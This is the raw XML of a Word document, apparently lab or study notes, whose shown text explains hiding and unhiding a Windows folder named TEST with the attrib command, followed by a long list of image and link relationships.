          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW TO hide this directory from showing up we need to type 👍</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000267">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000268">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">attrib +h +s +r TEST</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000269">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now if we type dir then we will not be able to see TEST cause it is hidden now</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">To get it back we need to type:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">attrib -h -s -r TEST</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000026F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">*********************end**********************************************</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000270">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000271">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000272">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000273">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000274">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000275">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000276">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000277">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000278">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000279">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="green"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000027A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="gree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75.png"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://10.10.1.3/share" TargetMode="External"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image95.png"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image24.png"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image25.png"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image94.png"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image89.png"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image90.png"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image61.png"/><Relationship Id="rId103" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image80.png"/><Relationship Id="rId102" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image35.png"/><Relationship Id="rId101" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image67.png"/><Relationship Id="rId100" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image16.png"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image46.png"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image41.png"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image19.png"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image55.png"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image92.png"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image96.png"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image85.png"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image45.png"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image39.png"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image31.png"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://10.10.1.3/share" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image68.png"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image18.png"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image36.png"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image49.png"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image71.png"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image9.png"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image33.png"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image6.png"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image87.png"/><Relationship Id="rId95" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image83.png"/><Relationship Id="rId94" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image70.png"/><Relationship Id="rId97" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image77.png"/><Relationship Id="rId96" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image32.png"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image4.png"/><Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image28.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image53.png"/><Relationship Id="rId98" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image29.png"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image84.png"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image50.png"/><Relationship Id="rId91" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image2.png"/><Relationship Id="rId90" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image40.png"/><Relationship Id="rId93" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image22.png"/><Relationship Id="rId92" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image20.png"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image76.png"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image27.png"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image63.png"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image66.png"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image51.png"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image62.png"/><Relationship Id="rId84" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image54.png"/><Relationship Id="rId83" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image72.png"/><Relationship Id="rId86" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image43.png"/><Relationship Id="rId85" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image8.png"/><Relationship Id="rId88" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image56.png"/><Relationship Id="rId87" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image81.png"/><Relationship Id="rId89" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image93.png"/><Relationship Id="rId80" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image48.png"/><Relationship Id="rId82" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image73.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1.png"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image69.png"/><Relationship Id="rId73" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image79.png"/><Relationship Id="rId72" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image74.png"/><Relationship Id="rId75" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image5.png"/><Relationship Id="rId74" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image15.png"/><Relationship Id="rId77" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image78.png"/><Relationship Id="rId76" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image30.png"/><Relationship Id="rId79" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image23.png"/><Relationship Id="rId78" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image59.png"/><Relationship Id="rId71" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image82.png"/><Relationship Id="rId70" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image17.png"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image10.png"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image3.png"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image12.png"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image7.png"/><Relationship Id="rId66" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image91.png"/><Relationship Id="rId65" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/><Relationship Id="rId68" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image34.png"/><Relationship Id="rId67" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image37.png"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image44.png"/><Relationship Id="rId69" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image57.png"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image86.png"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image38.png"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image47.png"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image64.png"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image65.png"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image58.png"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image21.png"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image13.png"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image60.png"/><Relationship Id="rId5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